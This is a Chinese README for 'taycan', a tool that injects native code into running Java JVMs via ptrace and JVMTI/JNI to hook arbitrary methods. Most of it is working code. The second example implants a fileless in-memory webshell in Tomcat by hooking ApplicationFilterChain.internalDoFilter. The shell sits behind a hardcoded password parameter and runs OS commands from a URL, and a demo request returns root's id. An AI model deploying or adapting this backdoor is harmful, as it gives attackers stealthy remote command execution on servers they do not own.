# taycan
通过native层修改java层(JVM)，使用JVMTI及JNI API可以修改java任意类、执行任意代码，完成hook、插入内存马、反射等功能。
# 适用环境
LINUX KERNEL version > 3.2
GLIBC > 2.15
openJDK/OracleJDK 1.8 64bit
# 前置条件
编译前需要设置JAVA_HOME环境变量为JDK路径
# 使用方法
C代码的开发方法与JNI开发一致，可以反射调用java代码，也可以修改、hook任意java代码。开发步骤如下：  
1. 定义一个类A继承JavaNativeBase
2. 在类A的构造函数中，使用JNI的API查找java类、方法、执行反射等
3. 如果要hook方法，先定义好替换函数，比如hook_xxx
4. 调用hookJvmMethod，替换方法
5. 静态实例化A

生成的so文件，可以使用java System.load方法调用执行，也可以使用soloader通过ptrace方式注入执行。
## 示例1: hook java非native函数
如下TestJni.circle方法定时在屏幕打印haha
```JAVA
class TestJni{
    private void circle(){
        System.out.println("haha");
    }
    
    public static void main(String[] args) throws InterruptedException{
        TestJni a = new TestJni();
        while(true){
            a.circle();
            Thread.sleep(2000);
        }
	}
}
```
写如下代码，将TestJni.circle hook掉，在hook函数中调用System.out.println(""you are hacked"")
```C++
#include "include/java_native_base.h"
#include "include/jvm_method.h"
#include "jni.h"

class example : JavaNativeBase
{
public:
    example(/* args */);
    ~example(){};
};

static example _e;

JNIEXPORT void JNICALL hook_circle(JNIEnv* env, jobject thiz)
{
    // Get system class
    jclass syscls = env->FindClass("java/lang/System");
    // Lookup the "out" field
    jfieldID fid = env->GetStaticFieldID(syscls, "out", "Ljava/io/PrintStream;");
    jobject out = env->GetStaticObjectField(syscls, fid);
    // Get PrintStream class
    jclass pscls = env->FindClass("java/io/PrintStream");
    // Lookup printLn(String)
    jmethodID mid = env->GetMethodID(pscls, "println", "(Ljava/lang/String;)V");
    // Invoke the method
    jstring str = env->NewStringUTF( "you are hacked");
    env->CallVoidMethod(out, mid, str);
}

example::example(/* args */)
{
    JNIEnv * env = getEnv();
    if(env == NULL)
    {
        return;
    }
    
    jclass clazz = env->FindClass("TestJni");
    if(clazz == NULL){
        printf("FindClass error\n");
        return;
    }

    jmethodID method_circle = env->GetMethodID(clazz, "circle", "()V");
    if(method_circle == NULL){
        printf("GetMethodID circle error\n");
        return;
    }

    JVMMethod * method_stub = (JVMMethod *)method_circle;
    method_stub->print();
    hookJvmMethod(method_stub, (unsigned long)hook_circle);
}
```
编译生成so之后，使用soloader对JVM进程注入so
```
Usage:
	./soloader <jvmpid> <sopath> [is_unload]

soloader 77339 /root/taycan/example/libmy.so
```
参数分别为PID、so全路径。可以提供第4个参数，如果为1，表示so在注入运行之后立即就卸载。
## 示例2: 注入tomcat内存马
tomcat注入内存马，采用的办法是hook函数
```java
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse) : void
```
以下代码在tomcat8上测试通过
```C++
void example::inject_mem_shell()
{
    JNIEnv * env = getJNIEnv();
    if(env == NULL)
    {
        return;
    }

    jvmtiEnv * jvmti_env = getJVMTIEnv();
    if(jvmti_env == NULL)
    {
        return;
    }

    //printf("JVMTI ENV %p\n", jvmti_env);
    _applicationFilterChain_clazz = this->jvmti_find_class("org.apache.catalina.core.ApplicationFilterChain");
    if(_applicationFilterChain_clazz == NULL){
        printf("FindClass org.apache.catalina.core.ApplicationFilterChain error\n");
        return;
    }

    _servlet_clazz = this->jvmti_find_class("javax.servlet.Servlet");
    if(_servlet_clazz == NULL){
        printf("FindClass javax.servlet.Servlet error\n");
        return;
    }

    const char * internalDoFilter_signature = "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V";
    jmethodID internalDoFilter = env->GetMethodID(_applicationFilterChain_clazz, "internalDoFilter", internalDoFilter_signature);
    if(internalDoFilter == NULL){
        printf("jvmti_get_method internalDoFilter error\n");
        return;
    }

    JVMMethod * method = (JVMMethod *)internalDoFilter;
    //method->print();
    hookJvmMethod(method,(unsigned long)hook_internalFilter);
}
```
hook掉internalDoFilter方法，在前面加入内存马逻辑，之后正常调用this.servlet.service(req, rsp)保证页面的正常加载。  
方法原型为void internalDoFilter(javax.servlet.ServletRequest, javax.servlet.ServletResponse)，对应的JNI表示参数要增加JNIEnv *和this指针
```C++
JNIEXPORT void JNICALL hook_internalFilter(JNIEnv * env, jobject thiz, jobject req, jobject rsp)
{
    jobject model = req_get_paramter(env, req, "model");
    jobject pass_the_world = req_get_paramter(env, req, "pass_the_world");

    if(pass_the_world != NULL && string_equals(env, pass_the_world, "bigbestway"))
    {
        std::string result;
        if(model == NULL || string_equals(env, model, ""))
        {
            result = Memshell::help();
        }
        else if(string_equals(env, model, "exec"))
        {
            jobject cmd = req_get_paramter(env, req, "cmd");
            if(cmd == NULL)
            {
                result = Memshell::help();
            }
            else
            {
                result = Memshell::exec(string_getchars(env, (jstring)cmd).c_str());
            }
        }
        rsp_print(env, rsp, result.c_str());
        return;
    }

    //调用this.servlet.service(req, rsp);
    DPRINT("hook_internalFilter req=%p, rsp=%p\n", req, rsp);
    jfieldID fid = env->GetFieldID(_applicationFilterChain_clazz, "servlet", "Ljavax/servlet/Servlet;");
    DPRINT("fid=%p\n", fid);
    if(fid == NULL)
        return;
    jobject servlet = env->GetObjectField(thiz, fid);
    DPRINT("servlet=%p\n", servlet);
    if(servlet == NULL)
        return;
    jmethodID mid = env->GetMethodID(_servlet_clazz, "service", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V");
    DPRINT("mid=%p\n", mid);
    if(mid == NULL)
        return;
    env->CallVoidMethod(servlet, mid, req, rsp);
}
```
### 测试
下载apache-tomcat-8.5.69并解压到目录
```
/root/apache-tomcat-8.5.69
```
进入bin目录，在当前窗口启动tomcat
```
./catalina.sh run
```
通过浏览器访问8080端口，因为类是懒加载，需要访问一下才会加载org.apache.catalina.core.ApplicationFilterChain，否则hook时查找类会失败。通过ps命令获得JVM进程ID，执行命令注入shell
```
~/taycan/taycan-sdk# ./soloader 47706 `pwd`/libmy.so
```
执行成功会打印
```
this=0x7fc1a463d380,_constMethod=0x7fc1a463d060,_method_data=(nil),_method_counters=0x7fc1a4647118,_adapter=0x7fc1cc07b630,_from_compiled_entry=0x7fc1bd04e5b8,_code=(nil),_access_flags=2,_vtable_index=-2,_method_size=11,_intrinsic_id=0,_jfr_towrite=0,_caller_sensitive=0,_force_inline=0,_hidden=0,_dont_inline=0,_compiled_invocation_count=0,_i2i_entry=0x7fc1bd013600,_from_interpreted_entry=0x7fc1bd013600
_constMethod:
_fingerprint=8000000000000000,_constants=0x7fc1a463c338,_stackmap_data=0x7fc1a463d3d8,_constMethod_size=100,_flags=15,_code_size=14,_name_index=388,_signature_index=118,_method_idnum=100,_max_stack=5,_max_locals=5,_size_of_parameters=10
==================================
this=0x7fc1a463d380,_constMethod=0x7fc1a463d060,_method_data=(nil),_method_counters=(nil),_adapter=0x7fc1cc07b630,_from_compiled_entry=0x7fc1bd04e5b8,_code=(nil),_access_flags=e000102,_vtable_index=-2,_method_size=11,_intrinsic_id=0,_jfr_towrite=0,_caller_sensitive=0,_force_inline=0,_hidden=0,_dont_inline=0,_compiled_invocation_count=0,_i2i_entry=0x7fc1bd018340,_from_interpreted_entry=0x7fc1bd018340
_constMethod:
_fingerprint=8000000000000000,_constants=0x7fc1a463c338,_stackmap_data=(nil),_constMethod_size=100,_flags=15,_code_size=14,_name_index=388,_signature_index=118,_method_idnum=100,_max_stack=5,_max_locals=5,_size_of_parameters=10
```
使用URL访问内存马执行命令
```
http://192.168.92.128:8080/?pass_the_world=bigbestway&model=exec&cmd=id
```
页面显示命令结果
```
uid=0(root) gid=0(root) groups=0(root)
```
# 结语
目前仅在x86_64位测试
